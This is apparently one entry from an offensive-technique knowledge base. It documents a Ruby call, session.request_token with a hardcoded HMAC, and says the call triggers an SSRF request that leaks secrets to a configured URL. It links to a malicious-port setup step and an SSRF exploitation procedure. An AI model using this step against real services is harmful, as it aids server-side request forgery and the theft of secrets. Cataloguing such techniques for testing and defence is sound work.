---
id: cmd-request-token-001
data: >-
  access_token =
  session.request_token({'hmac'=>'d54d830d05601f0b4247f654e4c57b51318be655f40c7a7119141c98a23f6815','timestamp':'2000000000'})
tags:
  - exploitation
  - leak
type: command
output: Triggers SSRF request
executor: ruby
platforms:
  - Ruby
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:28.629Z'
verified: false
validated: true
submitted: true
---
---

# request-access-token

## Command

```ruby
access_token = session.request_token({'hmac'=>'d54d830d05601f0b4247f654e4c57b51318be655f40c7a7119141c98a23f6815','timestamp':'2000000000'})
```

## Description

Requests an access token from the session, triggering a POST to the configured URL with sensitive params, exploited for SSRF leakage.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| params | Hash with hmac and timestamp | Yes |

## Examples

### Basic Usage

```ruby
access_token = session.request_token({'hmac'=>'d54d830d05601f0b4247f654e4c57b51318be655f40c7a7119141c98a23f6815','timestamp':'2000000000'})
```

## Expected Output

Triggers SSRF request leaking secrets.

## Related

- [[commands/setup-session-malicious-port]]
- [[procedures/Exploit-Protocol-Parameter-for-SSRF]]

---
